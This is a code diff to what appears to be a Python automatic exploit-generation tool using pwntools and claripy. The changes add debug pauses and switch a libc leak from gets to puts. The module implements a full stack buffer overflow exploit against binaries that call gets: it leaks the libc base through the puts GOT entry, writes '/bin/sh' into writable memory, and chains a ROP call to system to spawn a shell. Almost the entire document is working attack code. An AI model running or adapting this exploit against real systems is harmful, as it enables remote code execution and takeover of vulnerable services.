@@ -27,6 +27,11 @@ class Vulnerability:
     
     def exploit(self, function):
         raise NotImplementedError()
+    
+    def dpause(self, conn):
+        if self.debug:
+            print(conn.conn.pid)
+            pwn.pause()
 
 # These should probably be factored out into a separate
 # function analysis module and be part of a Variable class or something
@@ -53,13 +58,15 @@ class StackBufferOverflowVulnerability(Vulnerability):
             libc : pwn.ELF,
             targetFunc,
             functionExit,
-            stackOffset):
+            stackOffset,
+            debug : bool = False):
         self.function = function
         self.binary = binary
         self.libc = libc
         self.targetFunc = targetFunc
         self.stackOffset = stackOffset
         self.functionExit = functionExit
+        self.debug = debug
     
     def __str__(self):
         fields = {
@@ -82,7 +89,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         return [ELF.NO_CANARY, ELF.KNOWN_MAIN, ELF.KNOWN_POP_RDI, ELF.KNOWN_GOT]
 
     @staticmethod
-    def detect(context, function, program, options):
+    def detect(context, function, program, options, debug=False):
         for call in function["calls"]:
             if call["funcName"] == "gets":
                 targetFunc = call
@@ -103,7 +110,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
                     context.libc,
                     targetFunc=targetFunc,
                     functionExit=function["exitAddresses"][0],
-                    stackOffset=stackOffset)
+                    stackOffset=stackOffset,
+                    debug=debug)
                     
             # Work in progress apparently
             # TODO: Get this working and tested
@@ -127,7 +135,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
                             context.libc,
                             targetFunc=call,
                             functionExit=function["exitAddresses"][0],
-                            stackOffset=stackOffset)
+                            stackOffset=stackOffset,
+                            debug=debug)
                         self.targetFunc = call
                         self.stackOffset = stackOffset
                         return BufferOverflow
@@ -150,38 +159,45 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # Navigate to targetFunc
         logger.info("Navigating to targetFunc.")
         conn.navigate(int(self.targetFunc["address"],16))
+        self.dpause(conn)
 
         # Payload1: leak libc location
         prefixlen = abs(self.stackOffset)
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
-        sm.pop_rdi(self.binary.got["gets"], target='binary') # this REQUIRES gets to be present
+        sm.pop_rdi(self.binary.got["puts"], target='binary') # this REQUIRES puts to be present
+        print("XXXX", hex(self.binary.got["puts"]))
         # TODO: make puts a dependency
         # TODO: abstract out puts to any print
         sm.ret("puts", 'binary')
         sm.ret(function_addr, "binary")
       
         # we should be leaking 'puts' here but I'm being dumb. 
-        logger.info("Sending first payload (to leak 'gets' location)")
+        logger.info("Sending first payload (to leak 'puts' location)")
        
         payload1 = sm.resolve(binary=0x0, libc=0x0)
         solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload1", size=8*prefixlen), claripy.BVV(payload1+b"\n")])
         logger.info(f"Solution Prefix Payload: {solution_payload}")
         conn.sim_send(solution_payload)
         sconn.send(solution_payload)
+        self.dpause(conn)
 
         logger.info(f"Navigating to function exit {self.functionExit}")
         conn.navigate(functionExit)
 
-        # We've hit the return, next output is now the 'gets' address
-        gets_location = sconn.recvline()[:-1]
-        logger.debug(f"gets_location: {gets_location}")
-        gets_location = int.from_bytes(gets_location, byteorder='little')
-        libcoffset = gets_location - self.libc.symbols["gets"]
+        # We've hit the return, next output is now the 'puts' address
+        # NOTE: We *must* use a function whose got has been resolved.
+        # since we're using puts anyhow, we know that it has been resolved.
+        response = sconn.recvline()
+        puts_location = response[:-1]
+        logger.debug(f"puts_location: {puts_location}")
+        puts_location = int.from_bytes(puts_location, byteorder='little')
+        libcoffset = puts_location - self.libc.symbols["puts"]
         logger.info("Libc found at {}".format(hex(libcoffset)))
 
         # need to navigate back to the targetFunc
         logger.info("Navigating to targetFunc.")
         conn.navigate(int(self.targetFunc["address"],16))
+        self.dpause(conn)
 
         logger.info("#####")
         logger.info("# STACK BUFFER OVERFLOW - STAGE 2: Write `/bin/sh` to writeable bss location")
@@ -200,19 +216,23 @@ class StackBufferOverflowVulnerability(Vulnerability):
         conn.sim_send(solution_payload)
         sconn.send(solution_payload)
         logger.info("Navigating to return.")
+        self.dpause(conn)
 
         logger.info("Navigating to function exit")
         conn.navigate(functionExit)
+        self.dpause(conn)
 
         # we have exited the function, we can now
         # write /bin/sh to a controlled part of memory
         logger.info(f"Writing '/bin/sh' to {hex(target_heap_address)}")
         conn.sim_send(b"/bin/sh\x00\n")
         sconn.send(b"/bin/sh\x00\n")
+        self.dpause(conn)
 
         # need to navigate back to the targetFunc
         logger.info("Navigating to targetFunc.")
         conn.navigate(int(self.targetFunc["address"],16))
+        self.dpause(conn)
 
         logger.info("#####")
         logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform system invocation")
@@ -230,9 +250,11 @@ class StackBufferOverflowVulnerability(Vulnerability):
         solution_payload = conn.scout(functionExit, [claripy.BVS("solution_payload_prefix3", size=8*prefixlen), claripy.BVV(payload3+b"\n")])
         conn.sim_send(solution_payload)
         sconn.send(solution_payload)
+        self.dpause(conn)
         
         # Payload sent, now exit the function.
         logger.info("Navigating to function exit")
         conn.navigate(functionExit)
+        self.dpause(conn)
         
         logger.info("We should now have a shell.")
